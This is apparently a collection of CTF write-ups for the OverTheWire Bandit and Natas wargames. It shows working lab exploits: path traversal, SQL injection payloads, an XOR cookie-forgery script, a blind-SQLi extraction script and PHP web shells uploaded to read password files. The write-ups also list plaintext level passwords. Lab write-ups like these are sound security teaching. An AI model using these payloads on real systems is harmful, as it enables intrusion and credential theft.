<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-aliev-ibra
description: CTF writeups and security challenges by aliev-ibra.
---

# Writeups by aliev-ibra

Source repository: `/repos/aliev-ibra`

## Repository Index

- BANDIT-Pentest-reports/Bandit-Level-0.md
- BANDIT-Pentest-reports/Bandit-Level-02.md
- BANDIT-Pentest-reports/Bandit-Level-03.md
- BANDIT-Pentest-reports/Bandit-Level-04.md
- BANDIT-Pentest-reports/README.md
- BANDIT-Pentest-reports/bandit_passwords.md
- NATAS-Pentest-reports/README.md
- NATAS-Pentest-reports/natas-level-00.md
- NATAS-Pentest-reports/reports/natas-level-01.md
- NATAS-Pentest-reports/reports/natas-level-02.md
- NATAS-Pentest-reports/reports/natas-level-03.md
- NATAS-Pentest-reports/reports/natas-level-04.md
- NATAS-Pentest-reports/reports/natas-level-05.md
- NATAS-Pentest-reports/reports/natas-level-06.md
- NATAS-Pentest-reports/reports/natas-level-07.md
- NATAS-Pentest-reports/reports/natas-level-08.md
- NATAS-Pentest-reports/reports/natas-level-09.md
- NATAS-Pentest-reports/reports/natas-level-10.md
- NATAS-Pentest-reports/reports/natas-level-11.md
- NATAS-Pentest-reports/reports/natas-level-12.md
- NATAS-Pentest-reports/reports/natas-level-13.md
- NATAS-Pentest-reports/reports/natas-level-14.md
- NATAS-Pentest-reports/reports/natas-level-15.md
- NATAS-Pentest-reports/reports/natas-level-16.md
- NATAS-Pentest-reports/reports/natas-level-17.md
- NATAS-Pentest-reports/reports/natas-level-18.md
- NATAS-Pentest-reports/reports/natas-level-19.md
- NATAS-Pentest-reports/reports/natas-level-20.md
- NATAS-Pentest-reports/reports/natas-level-21.md
- NATAS-Pentest-reports/reports/natas-level-22.md
- NATAS-Pentest-reports/reports/natas-level-23.md
- NATAS-Pentest-reports/reports/natas-level-24.md
- NATAS-Pentest-reports/reports/natas-level-25.md
- NATAS-Pentest-reports/reports/natas-level-26.md
- NATAS-Pentest-reports/reports/natas-level-27.md
- NATAS-Pentest-reports/reports/natas-level-28.md
- NATAS-Pentest-reports/reports/natas-level-29.md
- BANDIT-Pentest-reports/Level-01/Bandit-Level-01.md

## Writeup Content


### File: BANDIT-Pentest-reports/README.md

 # BANDIT – Pentest Reports

This repository contains structured penetration testing reports for the **OverTheWire Bandit** wargame.

## 🎯 Purpose
- Strengthen Linux fundamentals for penetration testing
- Develop professional reporting habits
- Build a public portfolio demonstrating structured security methodology

## 📌 Platform
- **Name:** OverTheWire – Bandit
- **Difficulty:** Beginner → Intermediate
- **Focus Areas:**
  - Linux fundamentals
  - File permissions
  - Encoding & decoding
  - SSH & networking basics
  - Scripting mindset

## 📂 Structure
Each level is documented in a dedicated directory with a professional Markdown report:




### File: NATAS-Pentest-reports/README.md

# NATAS-Pentest-reports
# Natas Web Hacking Labs

This repository documents my progress and findings while solving the **Natas series** of web hacking labs on [OverTheWire](http://overthewire.org/wargames/natas/).  
Each level focuses on a specific type of web vulnerability, gradually increasing in complexity.

---

## Lab Methodology

For each Natas level, the following approach is applied:

1. **Reconnaissance**
   - Access the provided URL using the supplied credentials.
   - Examine page content for visible or hidden clues.
   - Consider source code inspection (HTML, JS, CSS) and HTTP responses.

2. **Analysis**
   - Identify potential vulnerability types (Information Disclosure, SQL Injection, Authentication Bypass, etc.).
   - Decide whether manual inspection, browser developer tools, or web proxies (Burp Suite, etc.) are needed.

3. **Exploitation**
   - Extract necessary information (passwords, tokens, sensitive data) to progress to the next level.
   - Document the technique with screenshots or code snippets where appropriate.

4. **Reporting**
   - Record findings in a structured format:
     - **Target:** URL, credentials
     - **Vulnerability Type**
     - **Description**
     - **Steps to Reproduce**
     - **Impact**
     - **Remediation / Lessons Learned**


```html
<!-- The password for natas1 is XXXXXXXXX -->



### File: BANDIT-Pentest-reports/Bandit-Level-0.md

# Bandit Level 0 – Initial Access via SSH

## 📌 Level Information
- **Platform:** OverTheWire – Bandit
- **Level:** 0
- **Category:** Authentication / Linux Basics
- **Objective:** Log in to the remote system using SSH and retrieve the password for the next level.

---

## 🧠 Challenge Overview
This level introduces the basics of remote access using **Secure Shell (SSH)**.  
The main focus is understanding how to connect to a service running on a **non-standard port** and performing minimal post-login enumeration.

---

## 🔍 Provided Information
- **Host:** bandit.labs.overthewire.org
- **Port:** 2220
- **Username:** bandit0
- **Password:** bandit0

---

## 🛠️ Tools & Commands Used
- `ssh`
- `whoami`
- `pwd`
- `ls`
- `cat`

---

## ⚙️ Exploitation Steps

### 1️⃣ SSH Connection
The SSH service was accessed using the provided credentials on a non-default port:

```bash
ssh bandit0@bandit.labs.overthewire.org -p 2220



### File: BANDIT-Pentest-reports/Bandit-Level-02.md

# Bandit Level 2 → Level 3
**Category:** Linux CLI / Argument Parsing  
**Platform:** OverTheWire – Bandit  
**Difficulty:** Beginner → Intermediate Concept  

---

## 🎯 Objective
Extract the password for the next level from a file whose name:
- Contains **spaces**
- **Starts with `--`**, causing option parsing conflicts

---

## 🧠 Core Concept
Linux commands interpret arguments starting with `--` as **options**, not filenames.  

Even when quoted, filenames beginning with `--` can break commands unless explicitly handled.

This is a **real-world CLI parsing pitfall** relevant to:
- Bash scripting
- Automation
- Security tooling

---

## 🛠️ Commands Used
```bash
ssh
ls
cat



### File: BANDIT-Pentest-reports/Bandit-Level-03.md

# Bandit Level 3 → Level 4
**Category:** Linux Enumeration / Hidden Files  
**Platform:** OverTheWire – Bandit  

---

## 🎯 Objective
Retrieve the password for the next level from a **hidden file** located inside the `inhere` directory.

---

## 🧠 Core Concept
Linux treats any file starting with a dot (`.`) as hidden.  
Hidden files are not shown by default and require explicit enumeration.

---

## 🛠️ Commands Used
```bash
ssh
ls
cd
cat



### File: BANDIT-Pentest-reports/Bandit-Level-04.md

# Bandit Level 4 → Level 5
**Category:** Linux Enumeration / File Type Analysis  
**Platform:** OverTheWire – Bandit  
**Difficulty:** Beginner (with real-world relevance)

---

## 🎯 Objective
Identify and extract the password stored in the **only human-readable file** inside the `inhere` directory.

---

## 🧠 Pentester Mindset
Blindly opening files is inefficient and unsafe.  
A professional approach is to **classify files before interacting with them**.

This level focuses on:
- File type identification
- Avoiding terminal corruption
- Efficient enumeration

---

## 🛠️ Commands Used
```bash
ssh
ls
cd
file
cat
find



### File: BANDIT-Pentest-reports/Level-01/Bandit-Level-01.md

# Bandit Level 1 – Handling Dashed Filenames

## 📌 Level Information
- **Platform:** OverTheWire – Bandit
- **Level:** 1 → 2
- **Category:** Linux Basics / File Handling
- **Objective:** Read the contents of a file named `-` to obtain the password for the next level.

---

## 🧠 Challenge Overview
This level focuses on understanding how Linux commands interpret special characters in filenames.  
The target file is named `-`, which is commonly interpreted by Unix utilities as **standard input (STDIN)** rather than a regular filename.

The challenge tests awareness of:
- Option parsing in command-line utilities
- Safe handling of ambiguous or special filenames

---

## 🛠️ Tools & Commands Used
- `ssh`
- `whoami`
- `pwd`
- `ls`
- `cat`

---

## ⚙️ Exploitation Steps

### 1️⃣ Authentication
Logged into the system using credentials obtained from the previous level:

```bash
ssh bandit1@bandit.labs.overthewire.org -p 2220



### File: BANDIT-Pentest-reports/bandit_passwords.md

## Bandit Level 0
bandit0 : bandit0

## Bandit Level 1
bandit1 : ZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If

## Bandit Level 2
263JGJPfgU6LtdEvgfWU1XP5yac29mFx

## Bandit Level 3
MNk8KNH3Usiio41PRUEoDFPqfxLPlSmx

## Bandit Level 4
2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ

## Bandit Level 5
4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw



### File: NATAS-Pentest-reports/natas-level-00.md

# Natas Level 0 – Information Disclosure via HTML Source

## Target
- URL: http://natas0.natas.labs.overthewire.org
- Authentication: Basic Auth (natas0:natas0)

## Vulnerability Type
- Sensitive Information Disclosure
- Client-Side Source Code Exposure

## Description
The application exposes the password for the next authentication level
inside an HTML comment. This information is accessible by viewing the page
source without any special tools or privileges.

## Steps to Reproduce
1. Login using provided credentials.
2. Right-click on the page and select "View Page Source".
3. Inspect the HTML comments.
4. Observe the password for the next level.

## Impact
An attacker can retrieve authentication credentials without exploiting
any server-side logic, leading to unauthorized access to protected resources.

## Proof of Concept
```html
<!-- The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -->



### File: NATAS-Pentest-reports/reports/natas-level-01.md

# Natas Level 1 – Client-Side Restrictions Bypass

## Target
- URL: http://natas1.natas.labs.overthewire.org
- Username: natas1
- Password: Obtained from previous level

## Objective
Retrieve the password for **natas2**.

---

## Vulnerability Type
- Client-Side Security Control Bypass
- Information Disclosure

---

## Description
The application attempts to prevent users from accessing the page source by
disabling right-click functionality via client-side controls.  
This restriction is purely cosmetic and does not provide any real security.

Despite the disabled context menu, the page source remains fully accessible
through alternative browser features.

---

## Steps to Reproduce

1. Authenticate to the application using valid credentials.
2. Notice that right-click is disabled on the page.
3. Bypass the restriction using one of the following methods:
   - Browser menu: `View → Page Source`
   - Keyboard shortcut: `Ctrl + U`
   - Developer Tools (`F12`) → Elements tab
4. Inspect the HTML source.
5. Locate the password for the next level inside an HTML comment.

---

## Proof of Concept

```html
<!-- The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI -->



### File: NATAS-Pentest-reports/reports/natas-level-02.md

# Natas Level 2 – Directory Enumeration & Static File Disclosure

## Target
- URL: http://natas2.natas.labs.overthewire.org
- Username: natas2
- Password: Obtained from previous level

## Objective
Retrieve the password for **natas3**.

---

## Vulnerability Type
- Directory Listing Exposure
- Sensitive Information Disclosure via Static Files

---

## Description
The page claims that there is nothing available, but includes a reference
to a static resource located in a directory named `files/`.

This indicates the presence of an exposed directory that may contain
additional files accessible without authentication or filtering.

---

## Steps to Reproduce

1. Authenticate to the application using valid credentials.
2. View the page source and observe the following element:
   ```html
   <img src="files/pixel.png">


Manually navigate to the referenced directory:

http://natas2.natas.labs.overthewire.org/files/


Observe that directory listing is enabled.

Locate and open the file containing credentials.

Extract the password for the next level.
3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH



### File: NATAS-Pentest-reports/reports/natas-level-03.md

# Natas Level 3 – Information Disclosure via robots.txt

## Target
- URL: http://natas3.natas.labs.overthewire.org
- Username: natas3
- Password: Obtained from previous level

## Objective
Retrieve the password for **natas4**.

---

## Vulnerability Type
- Information Disclosure
- Insecure Use of robots.txt
- Directory Listing Exposure

---

## Description
The application uses a `robots.txt` file to hide sensitive directories from
search engines. However, this file is publicly accessible and reveals the
location of restricted resources.

Robots.txt does not enforce access control and should never be relied upon
to protect sensitive content.

---

## Steps to Reproduce

1. Authenticate to the application.
2. Access the robots.txt file:

http://natas3.natas.labs.overthewire.org/robots.txt

3. Identify disallowed directory paths.
4. Navigate to the disclosed directory.
5. Observe that directory listing is enabled.
6. Extract credentials from exposed files.

---

## Proof of Concept

```text
User-agent: *
Disallow: /s3cr3t/

Directory listing at /s3cr3t/ exposes a file containing credentials
for the next level.
Impact

Attackers can discover and access sensitive directories intended to be hidden,
leading to credential disclosure and unauthorized access.
Remediation

    Do not use robots.txt to protect sensitive resources.

    Implement proper authentication and authorization controls.

    Disable directory listing.

    Store sensitive data outside the web root.

Lessons Learned

    Hidden paths are not protected paths.

    robots.txt is a recon tool for attackers.

    Security through obscurity is ineffective.

Skills Reinforced

    Web reconnaissance

    robots.txt analysis

    Directory enumeration

    Real-world attack surface discovery



natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ



### File: NATAS-Pentest-reports/reports/natas-level-04.md

# Natas Level 4 – Authentication Bypass via Referer Header Trust

## Target
- URL: http://natas4.natas.labs.overthewire.org
- Username: natas4
- Password: Obtained from previous level

## Objective
Retrieve the password for **natas5**.

---

## Vulnerability Type
- Authentication Bypass
- Insecure Trust in Client-Controlled HTTP Headers

---

## Description
The application restricts access based solely on the value of the HTTP
`Referer` header. Since this header is fully controlled by the client, it
can be easily spoofed to bypass access controls.

---

## Steps to Reproduce

1. Authenticate to the application.
2. Observe the error message indicating an expected Referer value.
3. Send a request with a forged Referer header:

Referer: http://natas5.natas.labs.overthewire.org/

4. Access is granted and credentials for the next level are revealed.

---

## Proof of Concept

```bash
curl -u natas4:<password> \
-H "Referer: http://natas5.natas.labs.overthewire.org/" \
http://natas4.natas.labs.overthewire.org/

Impact

Attackers can bypass authentication mechanisms and gain unauthorized access
to protected resources by manipulating HTTP headers.
Remediation

    Do not use HTTP headers for authentication or authorization.

    Implement server-side session validation.

    Use secure tokens or cookies with proper validation.

    Validate access based on user identity, not request metadata.

Lessons Learned

    Client-controlled headers cannot be trusted.

    Security decisions must be enforced server-side.

    Error messages can leak critical implementation details.

Skills Reinforced

    HTTP protocol analysis

    Header manipulation

    Authentication bypass techniques

The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK



### File: NATAS-Pentest-reports/reports/natas-level-05.md

# Natas Level 5 – Authentication Bypass via Cookie Manipulation

**Platform:** OverTheWire – NATAS  
**Level:** 5  
**Category:** Web Application Security  
**Vulnerability Type:** Broken Authentication / Authorization  
**Tools:** Browser DevTools, Burp Suite, curl  

---

## Overview

This level demonstrates a common authentication flaw where access control is enforced using a client-side cookie without proper server-side validation.

The application responds with the message:

> **Access disallowed. You are not logged in**

indicating that authentication logic exists but is improperly implemented.

---

## Analysis

Inspection of the HTTP response headers reveals the following cookie:

Set-Cookie: loggedin=0


This indicates that the application determines authentication status solely based on a client-controlled cookie value.

No session identifier, token validation, or server-side verification is observed.

---

## Exploitation

### Method 1: curl

By modifying the cookie value, authentication checks can be bypassed.

```bash
curl -u natas5:<password> \
     -b "loggedin=1" \
     http://natas5.natas.labs.overthewire.org/

Result

The server returns restricted content, including the credentials for the next level.
Method 2: Burp Suite

    Enable Burp Proxy and intercept the request

    Locate the Cookie header:

Cookie: loggedin=0

Modify it to:

    Cookie: loggedin=1

    Forward the request

    Observe the response body containing protected information

Vulnerability Description

The application relies on a client-side cookie to determine authentication state.
Root Cause

    Authentication logic enforced on the client side

    No server-side session validation

    No integrity or authenticity checks on authentication flags

Impact

    Full authentication bypass

    Unauthorized access to sensitive data

    Potential privilege escalation in real-world applications

Security Recommendations

    Implement server-side session management

    Never trust client-controlled values for authentication decisions

    Use secure session identifiers with proper validation

    Apply HttpOnly and Secure flags to cookies

Key Takeaway

Authentication and authorization decisions must always be enforced on the server side.
Client-side values such as cookies and headers are fully attacker-controlled.







The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned



### File: NATAS-Pentest-reports/reports/natas-level-06.md

# Natas Level 6 – Information Disclosure via Insecure Include

## Overview
This challenge demonstrates how improper handling of included files can lead to sensitive information disclosure.  
The application includes a secret file located inside the web root without restricting direct access.

---

## Target Information

- **Level:** Natas 6
- **URL:** http://natas6.natas.labs.overthewire.org
- **Username:** natas6
- **Authentication:** HTTP Basic Auth

---

## Vulnerability Summary

- **Type:** Information Disclosure
- **Category:** Sensitive File Exposure
- **Severity:** Medium
- **CWE:** CWE-200 – Exposure of Sensitive Information to an Unauthorized Actor

---

## Root Cause Analysis

The application includes a file containing sensitive data using a relative path:

```php
include "includes/secret.inc";


The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS 



### File: NATAS-Pentest-reports/reports/natas-level-07.md

# Natas Level 7 – Local File Inclusion (LFI)

## Overview
This challenge demonstrates a Local File Inclusion vulnerability caused by unsanitized user input being used in dynamic file loading logic.

---

## Target Information

- **Level:** Natas 7
- **URL:** http://natas7.natas.labs.overthewire.org
- **Username:** natas7
- **Authentication:** HTTP Basic Auth

---

## Vulnerability Summary

- **Type:** Local File Inclusion (LFI)
- **Severity:** High
- **CWE:** CWE-98 – Improper Control of Filename for Include/Require Statement

---

## Root Cause Analysis

The application uses a GET parameter to dynamically load page content:

index.php?page=home


The value of the `page` parameter is not validated or sanitized before being used, allowing attackers to perform directory traversal and include arbitrary local files.

Additionally, a comment in the source code explicitly reveals the location of sensitive credentials.

---

## Exploitation Steps

### Step 1: Identify File Inclusion Vector

Navigation links reveal the `page` parameter controlling loaded content:

index.php?page=home
index.php?page=about


---

### Step 2: Perform Path Traversal

By supplying a crafted path, arbitrary system files can be read:

index.php?page=../../../../etc/natas_webpass/natas8


---

### Step 3: Retrieve Credentials

The response contains the password for the next level user (`natas8`), resulting in full authentication bypass.

---

## Impact

- Arbitrary file read
- Disclosure of sensitive credentials
- Full account compromise
- Potential escalation to remote code execution in real-world environments

---

## Proof of Concept

GET /index.php?page=../../../../etc/natas_webpass/natas8 HTTP/1.1
Host: natas7.natas.labs.overthewire.org
Authorization: Basic <redacted>


---

## Recommendations

- Never use user-controlled input in file inclusion logic
- Implement strict allowlists for included resources
- Disable directory traversal sequences (`../`)
- Store sensitive files outside of the web root
- Use routing mechanisms instead of dynamic includes

---

## Conclusion

This level highlights how insecure file inclusion combined with poor input validation can le



xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q 



### File: NATAS-Pentest-reports/reports/natas-level-08.md

# Natas 08 — Reversible Encoding Authentication Bypass

## Overview
Natas Level 8 demonstrates how using reversible encoding instead of proper cryptographic protection can lead to authentication bypass.  
The application compares an encoded user input against a hardcoded encoded value, which can be reversed to recover the original secret.

---

## Target

- **Application:** OverTheWire Natas
- **Level:** 8
- **URL:** http://natas8.natas.labs.overthewire.org
- **Authentication:** HTTP Basic Auth

---

## Vulnerability

- **Type:** Reversible Encoding (Security Through Obscurity)
- **Severity:** Medium
- **CWE:**
  - CWE-327 — Use of a Broken or Risky Cryptographic Algorithm
  - CWE-656 — Reliance on Security Through Obscurity

---

## Root Cause

The application encodes a secret using a fully reversible transformation and directly compares it with user input:

```php
function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}


The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t



### File: NATAS-Pentest-reports/reports/natas-level-09.md

# Natas 09 — OS Command Injection

## Overview
This level demonstrates an OS command injection vulnerability caused by passing unsanitized user input directly into a shell command executed by the application.

---

## Vulnerability

- **Type:** OS Command Injection
- **Severity:** High
- **CWE:** CWE-78 — Improper Neutralization of Special Elements used in an OS Command

---

## Root Cause

User input from the `needle` parameter is directly concatenated into a shell command and executed via `passthru()`:

```php
passthru("grep -i $key dictionary.txt");


t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu



### File: NATAS-Pentest-reports/reports/natas-level-10.md

# NATAS Level 10 – Argument Injection via grep

## 📌 Overview
This level attempts to mitigate command injection by blacklisting certain shell metacharacters. However, improper handling of command arguments allows file disclosure through `grep` misuse.

## 🔍 Vulnerable Code
```php
if(preg_match('/[;|&]/',$key)) {
    print "Input contains an illegal character!";
} else {
    passthru("grep -i $key dictionary.txt");
}


UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk



### File: NATAS-Pentest-reports/reports/natas-level-11.md

# Natas Level 11 – Client-Side Trust & XOR Encryption Bypass

## 📌 Overview
This challenge demonstrates a critical **client-side trust vulnerability** combined with **weak cryptographic design**.  
The application relies on a client-controlled cookie to make authorization decisions and protects it using **XOR encryption without integrity validation**.

This allows an attacker to:
- Recover the encryption key
- Modify sensitive authorization flags
- Gain unauthorized access to protected information

---

## 🎯 Objective
Reveal the password for **Natas Level 12** by manipulating the encrypted cookie.

---

## 🔍 Application Behavior

The application stores user preferences inside a cookie named `data`.

Example plaintext structure:
```json
{
  "showpassword": "no",
  "bgcolor": "#ffffff"
}

This JSON is:

    XOR-encrypted using a static key

    Base64-encoded

    Sent to the client as a cookie

The server fully trusts the decrypted cookie values.
🚨 Vulnerability Summary
1️⃣ Client-Side Authorization Control

Authorization logic depends on:

"showpassword": "yes"

stored entirely on the client side.
2️⃣ Weak Encryption (XOR)

XOR encryption is used without:

    HMAC

    Signature

    Integrity verification

    Session binding

3️⃣ Known-Plaintext Attack

Because the plaintext structure is known, the XOR key can be recovered.
🧠 Root Cause

    Server treats encrypted cookie as a trusted source

    No integrity or authenticity validation

    XOR encryption reused with static key

💥 Impact

An attacker can:

    Forge arbitrary cookie values

    Escalate privileges

    Access sensitive server-side data

This is a real-world authorization bypass vulnerability.
🧪 Exploitation Steps
Step 1: Obtain Cookie

Intercept the data cookie from the browser.

Example:

data=HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=

Step 2: Recover XOR Key

Using known plaintext:

{"showpassword":"no","bgcolor":"#ffffff"}

XOR rule:

key = cipher ⊕ plaintext

Step 3: Forge Malicious Payload

Change:

"showpassword": "no"

to:

"showpassword": "yes"

🧩 Exploit Code (Python)

import base64
from urllib.parse import unquote

# URL-decoded cookie from the browser
cookie_b64 = "HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D"
cookie_b64 = unquote(cookie_b64)

# Known plaintext
known_plain = b'{"showpassword":"no","bgcolor":"#ffffff"}'

# Decode cookie
cipher = base64.b64decode(cookie_b64)

# Recover XOR key
raw_key = bytes(
    cipher[i] ^ known_plain[i]
    for i in range(min(len(cipher), len(known_plain)))
)

def find_key(raw):
    for size in range(1, 20):
        chunks = [raw[i::size] for i in range(size)]
        if all(len(set(chunk)) == 1 for chunk in chunks):
            return raw[:size]
    return raw

key = find_key(raw_key)
print("[+] XOR key:", key)

# Malicious payload
payload = b'{"showpassword":"yes","bgcolor":"#ffffff"}'

# Encrypt payload
encrypted = bytes(
    payload[i] ^ key[i % len(key)]
    for i in range(len(payload))
)

final_cookie = base64.b64encode(encrypted).decode()
print("[+] Forged cookie:", final_cookie)

🧪 Result

Send forged cookie with valid credentials:

curl -u natas11:<PASSWORD> \
  -H "Cookie: data=<FORGED_COOKIE>" \
  http://natas11.natas.labs.overthewire.org

✅ Output

The password for natas12 is: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB

🛡️ Remediation

    Never trust client-side state for authorization

    Do not use XOR for security purposes

    Use authenticated encryption (AES-GCM)

    Add HMAC or digital signatures

    Bind sensitive state to server-side sessions

🧠 Key Takeaways

    Encryption ≠ Security

    Integrity is more important than secrecy

    Client-side authorization flags are dangerous

    XOR is cryptographically broken by design



### File: NATAS-Pentest-reports/reports/natas-level-12.md

# OverTheWire NATAS – Level 12 Write‑Up

## 📌 Level Information
- **Challenge:** NATAS 12
- **Category:** File Upload Vulnerability
- **Impact:** Remote Code Execution (RCE)
- **Goal:** Obtain the password for `natas13`

---

## 🔍 Vulnerability Overview

The application provides a file upload feature intended only for JPEG images.  
However, **server-side validation is weak** and relies solely on the filename extension provided via a hidden POST parameter.

### Key Issues:
- File extension is **user‑controlled**
- No MIME‑type validation
- Uploaded files are placed in a **web-accessible directory**
- PHP files are **executed**, not blocked

This allows an attacker to upload a malicious PHP file and execute arbitrary commands on the server.

---





⚠️ The extension is extracted from $_POST["filename"], which can be fully controlled by the attacker.
🧨 Exploitation Strategy

    Upload a PHP web shell disguised as an image

    Force the server to save the file with a .php extension

    Access the uploaded shell via browser or curl

    Execute system commands to retrieve credentials

💣 Payload Used
Malicious PHP Shell

<?php echo shell_exec($_GET['cmd']); ?>

🚀 Exploitation Steps
1️⃣ Upload Malicious File

curl -u 'natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB' \
-F "uploadedfile=@shell.php" \
-F "filename=shell.php" \
http://natas12.natas.labs.overthewire.org/index.php

2️⃣ Server Response

The file <a href="upload/77dgw16o7h.php">upload/77dgw16o7h.php</a> has been uploaded

3️⃣ Execute Remote Command

curl -u 'natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB' \
"http://natas12.natas.labs.overthewire.org/upload/77dgw16o7h.php?cmd=cat%20/etc/natas_webpass/natas13"

🎯 Result

trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC

✅ Password for natas13 successfully retrieved
🛡️ Security Impact

    Arbitrary command execution

    Full read access to sensitive files

    Potential lateral movement

🔐 Mitigation Recommendations

    Enforce strict MIME‑type validation

    Ignore client‑provided filenames

    Store uploads outside web root

    Disable PHP execution in upload directories

    Apply allowlist-based extension checks

🧠 Key Takeaways

    Client-side controls are never security

    File upload functionality is high‑risk

    Hidden parameters ≠ protected parameters

    Always test execution, not just upload

🏁 Conclusion

This challenge demonstrates how a simple file upload feature can lead to full remote code execution when basic security controls are missing.

Understanding and exploiting such flaws is critical for real‑world web application penetration testing.



### File: NATAS-Pentest-reports/reports/natas-level-13.md

# Natas Level 13 — File Upload Bypass (EXIF Validation Abuse)

## 📌 Summary

- **Platform:** OverTheWire – Natas
- **Level:** 13
- **Vulnerability:** Improper File Upload Validation
- **Impact:** Remote Code Execution (RCE)
- **Objective:** Retrieve `/etc/natas_webpass/natas14`

---



Observations

    ✔️ EXIF header validation is used

    ❌ File extension is not restricted

    ❌ MIME type is not enforced

    ❌ Uploaded files are executable

    ❌ Upload directory is web-accessible

This creates a condition where polyglot files (valid image headers + PHP code) are accepted and executed.
⚔️ Exploitation Technique

The vulnerability is exploited by uploading a JPEG–PHP polyglot file:

    JPEG magic bytes satisfy exif_imagetype()

    Embedded PHP payload enables command execution

    File is saved with a .php extension

🧨 Payload Creation

printf "\xFF\xD8\xFF\xE0\n<?php echo shell_exec(\$_GET['cmd']); ?>" > shell.php

    FF D8 FF E0 → Valid JPEG header

    PHP payload executes arbitrary OS commands via cmd parameter

📤 Uploading the Payload

curl -u 'natas13:<PASSWORD>' \
-F "uploadedfile=@shell.php" \
-F "filename=shell.php" \
http://natas13.natas.labs.overthewire.org/index.php

Server Response

The file upload/y3zafyqszb.php has been uploaded

The filename is randomized, but the .php extension is preserved.
💥 Remote Code Execution

Trigger the uploaded shell:

curl -u 'natas13:<PASSWORD>' \
"http://natas13.natas.labs.overthewire.org/upload/y3zafyqszb.php?cmd=cat%20/etc/natas_webpass/natas14"

Output

z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ

✔️ Password for natas14 successfully retrieved
🧠 Root Cause Analysis

    Reliance on EXIF validation alone

    No defense-in-depth for file uploads

    Executable upload directory

    User-controlled file extensions

🛡️ Security Recommendations

    Enforce strict file extension allow-lists

    Validate MIME type and content

    Store uploads outside the web root

    Disable script execution in upload directories

    Rename uploaded files without preserving extensions

✅ Result

Level completed successfully
Remote command execution achieved via file upload bypass.



### File: NATAS-Pentest-reports/reports/natas-level-14.md

# NATAS Level 14 – SQL Injection Authentication Bypass

## Target
- **URL:** http://natas14.natas.labs.overthewire.org/index.php
- **Authentication:** HTTP Basic Auth
- **Username:** natas14
- **Password:** Obtained from previous level

---

## Vulnerability Overview
The application is vulnerable to **SQL Injection** due to unsafe string concatenation when constructing SQL queries using user-supplied input.

### Vulnerable Source Code

$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" 
and password=\"".$_REQUEST["password"]."\"";

    User input is directly injected into the SQL query

    No input validation or prepared statements are used

Attack Technique

Authentication bypass using SQL tautology

The goal is to force the SQL condition to always evaluate as TRUE.
Injection Payload

" OR 1=1 -- 

This payload:

    Closes the string context

    Injects a condition that always evaluates to true

    Comments out the remaining SQL logic

Exploitation Steps
HTTP Request

curl -u natas14:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC \
-d 'username=" OR 1=1 -- &password=x' \
http://natas14.natas.labs.overthewire.org/index.php

Result
Server Response

Successful login! The password for natas15 is:
SdqIqBsFcz3yotlNYErZSZwblkm0lrvx

Extracted Credentials

    Level: natas15

    Password: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx

Root Cause

    Dynamic SQL query construction

    Lack of input sanitization

    Absence of prepared statements

Mitigation Recommendations

    Use prepared statements with parameterized queries

    Validate and sanitize all user input

    Avoid exposing sensitive credentials in application responses

Conclusion

This level demonstrates how a basic SQL Injection vulnerability can fully bypass authentication mechanisms when secure coding practices are not followed.



### File: NATAS-Pentest-reports/reports/natas-level-15.md

# OverTheWire NATAS – Level 15 Write-up

## 🧩 Challenge Overview

**Level:** NATAS 15  
**Category:** Web Security / SQL Injection  
**Vulnerability Type:** Blind SQL Injection (Boolean-based)  
**Authentication:** HTTP Basic Auth  

The goal of this level is to extract the password for **natas16** by exploiting a blind SQL injection vulnerability in the `username` parameter.

---

## 🔍 Application Analysis

The backend query used by the application:

sql
SELECT * FROM users WHERE username="$_REQUEST[username]"

Key observations:

    User input is directly concatenated into the SQL query

    No sanitization or prepared statements

    No output of database content

    Only boolean feedback is provided:

        "This user exists."

        "This user doesn't exist."

This confirms a boolean-based blind SQL injection scenario.
💥 Vulnerability Explanation

Although no data is returned directly, the response message allows inference:

    If the injected condition evaluates to TRUE → "This user exists."

    If FALSE → "This user doesn't exist."

This behavior can be abused as an oracle to extract the password character-by-character.
🛠️ Exploitation Strategy
Injection Logic

We target the password of user natas16 using prefix matching:

natas16" AND password LIKE BINARY 'a%' -- 

If the response indicates the user exists, the guessed prefix is correct.
Attack Flow

    Iterate over a predefined character set:

    a-z A-Z 0-9

    Build the password incrementally

    Send HTTP requests with injected payloads

    Detect TRUE/FALSE via response content

    Continue until full password is extracted

🧪 Proof of Concept (Python)

import requests
from requests.auth import HTTPBasicAuth
import string

url = "http://natas15.natas.labs.overthewire.org/index.php"
auth = HTTPBasicAuth("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")

charset = string.ascii_letters + string.digits
password = ""

while True:
    found = False
    for c in charset:
        payload = f'natas16" AND password LIKE BINARY "{password}{c}%" -- '
        r = requests.post(url, auth=auth, data={"username": payload})

        if "This user exists" in r.text:
            password += c
            print(f"[+] {password}")
            found = True
            break

    if not found:
        break

print("\nFINAL NATAS16 PASSWORD:", password)

✅ Result

FINAL NATAS16 PASSWORD:
hPkjKYviLQctEW33QmuXL6eDVfMW4sGo

